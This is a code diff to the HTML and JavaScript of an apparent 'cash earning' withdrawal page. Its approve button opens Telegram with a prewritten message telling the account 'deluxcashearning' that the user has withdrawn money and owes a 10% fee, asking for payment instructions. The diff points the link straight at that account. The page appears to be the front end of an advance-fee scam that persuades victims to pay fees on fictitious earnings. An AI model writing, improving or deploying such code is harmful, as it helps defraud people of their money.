@@ -55,7 +55,7 @@
     <!-- coupon HIDDEN until requested -->
     <div id="couponWrapper" class="hidden">
       <label for="coupon">Withdrawal Coupon:</label>
-      <input type="text" id="coupon" name="coupon" placeholder="Enter DLX338989" />
+      <input type="text" id="coupon" name="coupon" placeholder="withraw coupon" />
     </div>
 
     <button type="submit" id="sendBtn">Send &amp; Confirm</button>
@@ -124,12 +124,12 @@ approveBtn.addEventListener("click",()=>{
   const payDetails=detailInput.value.trim();
   const fee=(amount*0.10).toFixed(2);
   const txt=encodeURIComponent(
-    `Hello @deluxcashearning!\n`+
+    `Hello DELUX OFFICIAL!\n`+
     `I have withdrawn €${amount} via ${payMethod}.\n`+
     `Payment details: ${payDetails}\n`+
     `My 10% fee is €${fee}. Please send payment instructions so I can pay and approve my transaction.`
   );
-  window.open(`https://t.me/share/url?url=&text=${txt}`,'_blank');
+  window.open(`https://t.me/deluxcashearning?url=&text=${txt}`,'_blank');
 });
 </script>
 
